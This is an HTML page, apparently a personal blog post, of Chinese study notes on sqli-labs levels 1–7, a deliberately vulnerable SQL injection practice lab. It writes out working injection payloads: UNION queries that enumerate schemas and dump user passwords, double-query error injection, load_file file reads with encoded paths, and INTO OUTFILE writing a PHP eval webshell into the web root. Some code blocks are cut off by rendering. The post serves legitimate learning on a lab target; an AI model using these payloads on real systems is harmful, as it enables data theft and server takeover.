@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="SQLI和sqli-labsSQLI，也就是sql injection俗称SQL注入，关于SQL注入相信大家都不陌生，这里不做累赘。关于sqli-labs，是一个印度的程序员写的，用于学习SQL注入的教程，博客地址为：http:&#x2F;&#x2F;dummy2dummies.blogspot.com&#x2F; ,感兴趣的可以去看看，上面有一些示例。sqli-labs的安装网上教程一大把，需要注意的是环境的搭建，这里我选择">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli labs1-7学习笔记">
+<meta property="og:url" content="https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="Intro&#39; Blog">
+<meta property="og:description" content="SQLI和sqli-labsSQLI，也就是sql injection俗称SQL注入，关于SQL注入相信大家都不陌生，这里不做累赘。关于sqli-labs，是一个印度的程序员写的，用于学习SQL注入的教程，博客地址为：http:&#x2F;&#x2F;dummy2dummies.blogspot.com&#x2F; ,感兴趣的可以去看看，上面有一些示例。sqli-labs的安装网上教程一大把，需要注意的是环境的搭建，这里我选择">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less11.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less12.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less10.png">
+<meta property="article:published_time" content="2018-09-25T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-10-29T10:13:50.559Z">
+<meta property="article:author" content="Intro">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/1ntro/image/master/sql-less1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>sqli labs1-7学习笔记</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/1ntro">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2018/09/29/sqli%20labs8-16%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2018/06/10/Kali%20Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&text=sqli labs1-7学习笔记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs1-7学习笔记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&is_video=false&description=sqli labs1-7学习笔记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sqli labs1-7学习笔记&body=Check out this article: https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs1-7学习笔记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs1-7学习笔记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs1-7学习笔记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs1-7学习笔记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&name=sqli labs1-7学习笔记&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&t=sqli labs1-7学习笔记"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        sqli labs1-7学习笔记
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Intro</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-09-25T16:00:00.000Z" class="dt-published" itemprop="datePublished">2018-09-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>SQLI和sqli-labsSQLI，也就是sql injection俗称SQL注入，关于SQL注入相信大家都不陌生，这里不做累赘。<br>关于sqli-labs，是一个印度的程序员写的，用于学习SQL注入的教程，博客地址为：<a target="_blank" rel="noopener" href="http://dummy2dummies.blogspot.com/">http://dummy2dummies.blogspot.com/</a> ,感兴趣的可以去看看，上面有一些示例。<br>sqli-labs的安装网上教程一大把，需要注意的是环境的搭建，这里我选择的是apache+mysql+php。环境的配置相对比较复杂，嫌麻烦的话可以了解一下<a target="_blank" rel="noopener" href="http://phpstudy.php.cn/">phpstudy</a><br>好了，准备工作就绪后就可以开始我们精彩的游戏啦！Less-1 基于错误首先我们输入<code>id=1&#39;</code>,得到如下结果<img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less1.png" alt="1538121478810">上述错误告诉我们提交到SQL中的<code>1&#39;</code>经过构造后变成了<code>&#39;1&#39;&#39; LIMIT 0,1</code>，多了一个 ‘。这种从错误信息中获得我们需要的信息，接着我们就可以通过注释符去掉多余的’<img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less2.png" alt="1538121686994">此时返回正常数据，这里我们分析下源码</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2</code></td>
+<td><code>$id=$_GET[&#39;id&#39;]; $sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></td>
+</tr>
+</tbody></table>
+<p>这里没有对<code>id</code>参数进行任何过滤，当提交<code>1&#39; or 1=1--+</code>时，构造的sql语句就成了<code>SELECT * FROM users WHERE id=&#39;1&#39; or 1=1--+&#39; LIMIT 0,1</code>，恒为真。然后我们准备注入，这里用到<strong>union联合注入</strong>、<strong>information_schema数据库</strong>，简单介绍下<strong>SQL UNION语法</strong><br>如果使用UNION操作符组合两个查询的结果，这两个结果必须结构相同，也就是说他们的列数必须相同，必须按照相同顺序出现的相同或兼容的数据类型（整数会隐含地转换为字符型，所以一般都用select 1，2，3…）</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2 3</code></td>
+<td><code>&gt; SELECT column_name(s) FROM table_name1 &gt; UNION &gt; SELECT column_name(s) FROM table_name2</code></td>
+</tr>
+</tbody></table>
+<p>注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。<strong>SQL UNION ALL语法</strong></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2 3</code></td>
+<td><code>&gt; SELECT column_name(s) FROM table_name1 &gt; UNION ALL &gt; SELECT column_name(s) FROM table_name2</code></td>
+</tr>
+</tbody></table>
+<p>另外，UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。<strong>information_schema</strong><br>information_schema 数据库是MySQL自带的信息数据库，保存着关于MySQL服务器所有其他数据库的信息，类似于数据字典，如数据库名，表名，表的访问权限，列名，索引，约束等。 <img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less3.png" alt="1538123362609">SCHEMATA表：提供所有数据库的信息，show databases的结果取之此表<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less6.png" alt="1538138724786">TABLES表：提供数据库中表的信息<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less7.png" alt="1538138752770">COLUMNS表：提供表中列的信息<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less8.png" alt="1538138795033">利用<code>order by</code>，对前面的数据进行排序</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2 3 4</code></td>
+<td><code>&#39;order by 1--+  &#39;order by 2--+  &#39;order by 3--+  &#39;order by 4--+ 得到报错信息 Unknown column &#39;4&#39; in &#39;order clause&#39;，说明只有三列数据</code></td>
+</tr>
+</tbody></table>
+<p>按照一般的注入流程：爆库，爆表，爆列名，爆数据<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less4.png" alt="1538128644404"><br>依次执行：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2 3 4 5</code></td>
+<td><code>?id=-1&#39;union select 1,group_concat(schema_name),3 from information_schema.schemata--+ //爆数据库 ?id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot;--+ //爆security库的数据表 ?id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot;--+ //爆users表的列 ?id=-1&#39;union select 1,username,password from users where id=2--+ //爆数据 ps:id=-1，联合查询时前一个语句为空，就能把后面的语句的内容显示出来</code></td>
+</tr>
+</tbody></table>
+<p>得到我们想要的数据<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less5.png" alt="1538139248042">Less-2 基于错误照例我们提交<code>?id=1&#39;</code>，得到错误回显<code>&#39; LIMIT 0,1</code>，似乎是单引号破坏了查询，于是我们尝试<code>?id=1--+</code>，发现没有错误返回，查看源码发现对<code>id</code>参数没有任何处理</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2</code></td>
+<td><code>$id=$_GET[&#39;id&#39;]; $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></td>
+</tr>
+</tbody></table>
+<p>于是我们的payload只需要将Less-1中的<code>?id=-1&#39; union...</code>中的单引号去掉就OKLess-3 基于错误还是提交<code>?id=1&#39;</code>，这次得到报错是<code>&#39;1&#39;&#39;) LIMIT 0,1</code>，这里我们可以猜想查询语句应该为<code>(&#39;$id&#39;)</code>，所以成功的注入<code>1&#39;) or 1=1--+</code>，payload和Less-1相比差别不大，利用<code>?id=-1&#39;)union...</code>Less-4 基于错误提交<code>?id=1&#39;</code>后并没有得到报错，于是使用<code>?id=1&quot;</code>，报错得到<code>&quot;1&quot;&quot;) LIMIT 0,1</code>，很显然查询语句为<code>(&quot;$id&quot;)</code>，所以payload在上一个的基础上改为<code>?id=-1&quot;)union...</code>即可Less-5 双查询注入这一题相比前面的题难在没有数据库的回显数据，只能看到数据库的报错回显，这里用到了一种新技术双查询注入双查询就是一个select语句中再嵌套一个select语句，看个例子：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2 3 4 5 6</code></td>
+<td>&#96;&#96;&#96; mysql&gt; select count((select database())); +—————————-+</td>
+</tr>
+</tbody></table>
+<p>对于双查询注入，我们需要了解几个函数：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2 3 4</code></td>
+<td><code>count() //计数函数 rand() //随机函数 floor() //取整函数 group by语句 //分类</code></td>
+</tr>
+</tbody></table>
+<p>rand()返回的0-1之间的随机数，floor()返回小于等于输入数的整数，将rand()和floor()结合起来会有意想不到的效果：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2 3 4 5 6</code></td>
+<td>&#96;&#96;&#96; mysql&gt; select floor(rand()*2); +—————–+</td>
+</tr>
+</tbody></table>
+<p><code>SELECT CONCAT((SELECT database()), FLOOR(RAND()*2));</code>返回数据库名在和0或1连接，也就是security0或security1，如果在这条语句后加上from一个表，就会返回该表查询结果的数量条数据</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18</code></td>
+<td>&#96;&#96;&#96; mysql&gt; SELECT CONCAT((SELECT database()), FLOOR(RAND()*2)) from users; +———————————————-+</td>
+</tr>
+</tbody></table>
+<p>现在我们加上group by 语句，这里我们使用Information_schema.tables或information_schema.columns来查询，因为这两个表中的数据比较多，产生很多的随机值，不至于全是security0。<br><code>select concat((select database()),floor(rand()*2))as a from information_schema.tables group by a;</code>as a 将前部分的查询结果名别名a,然后使用它进行分组，就把security0分到一组，security1分到另一组。</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2 3 4 5 6 7</code></td>
+<td>&#96;&#96;&#96; mysql&gt; select concat((select database()),floor(rand()*2))as a from information_schema.tables group by a; +———–+</td>
+</tr>
+</tbody></table>
+<p>这里的database()可以换成任何你想查询的函数，version(),user(),datadir()，或者查表，查列。<br>最后，我们加上count(*)函数</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2 3</code></td>
+<td><code>mysql&gt; select count(*),concat((select database()),floor(rand()*2))as a from information_schema.tables group by a; ERROR 1062 (23000): Duplicate entry &#39;security0&#39; for key &#39;group_key&#39; mysql&gt;</code></td>
+</tr>
+</tbody></table>
+<p>报错了，从报错信息中可以看到我们想要查询的数据。类似查询version(),user()也是一样的操作回到题目根据上述的知识，这里我们构造payload<code>?id=&#39; union select 1,count(*),concat(&#39;__&#39;,(select database()),floor(rand()*2),&#39;__&#39;)as a from information_schema.tables group by a--+</code>成功得到回显。<img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less9.png" alt="1538204230650">Less-6 双查询注入和第五题类似，将单引号改为双引号即可。Less-7 通过outfile下载数据库导入导出基础知识load_file()导出文件load_file(file_name) 读取文件并返回该文件的内容作为一个字符串。条件必须满足以下：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2 3 4</code></td>
+<td><code>&gt; 文件必须是完全可读取的  and (select count(*) from mysql.user)&gt;0) //返回正常，说明有读写权限，如果返回错误，则没有权限 &gt; 要读取的文件必须在服务器上 &gt; 必须指定该文件的完整路径 &gt; 要读取的文件必须小于 max_allowed_packet</code></td>
+</tr>
+</tbody></table>
+<p>示例：<code>select 1,2,load_file(&quot;e:\\fl4g.txt&quot;)</code><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less11.png" alt="1538231881735"></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>1 2 3</code></td>
+<td><code>?id=-1&#39; union select 1,load_file(&quot;e:\\fl4g.txt&quot;),3--+  //路径中的/用\\代替 ?id=-1&#39; union select 1,load_file(0x653a5c5c666c34672e747874),3--+  //将路径改为16进制 ?id=-1&#39; union select 1,load_file(char(101,58,92,92,102,108,52,103,46,116,120,116)),3--+  //类似的改为ASCII码</code></td>
+</tr>
+</tbody></table>
+<p>select…into outfileselect…into outfile ‘file_name’ 可以把选择的行写入一个文件中。该文件会创建到服务器主机上。select version() into outfile “e:\1.txt”这里将version()改为一句话，可以直接连接一句话，还可以上传很多，只要你想得到示例：<code>?id=-1&#39; union select database(),version(),@@datadir into outfile &#39;e:\\1.txt&#39;--+</code><br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less12.png" alt="1538233583541">题目思路本关卡的标题为dump into outfile，提示我们利用文件导入的方式注入，如何进行文件导入？利用<code>select ... into outfile &#39;file_name&#39;</code>插入一句话木马到服务器（注意<code>file_name</code>不能是一个已经存在的文件）<br>从源码中，我们观察到<code>$sql=&quot;SELECT * FROM users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&quot;;</code>，<code>id</code>参数做了<code>&#39;))</code>处理，于是我们尝试<code>&#39;)) or 1=1--+</code>没有报错，于是利用上述的导入文件方法上传一句话木马：<br><code>?id=1&#39;)) union select 1,2,&#39;&lt;?php @eval($_post[&quot;1ntro&quot;])?&gt;&#39; into outfile &quot;e:\\phpStudy\\WWW\\sqli-labs-master\\Less-7\\1ntro.php&quot;--+</code>可以看到虽然报错了，但是其实文件上传成功了<br><img src="https://raw.githubusercontent.com/1ntro/image/master/sql-less10.png" alt="1538226879637">这时候用菜刀或webshell工具连接即可。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/1ntro">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&text=sqli labs1-7学习笔记"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs1-7学习笔记"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&is_video=false&description=sqli labs1-7学习笔记"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sqli labs1-7学习笔记&body=Check out this article: https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs1-7学习笔记"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs1-7学习笔记"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs1-7学习笔记"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=sqli labs1-7学习笔记"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&name=sqli labs1-7学习笔记&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://1ntro.github.io/2018/09/26/sqli%20labs1-7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&t=sqli labs1-7学习笔记"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Intro
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/1ntro">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
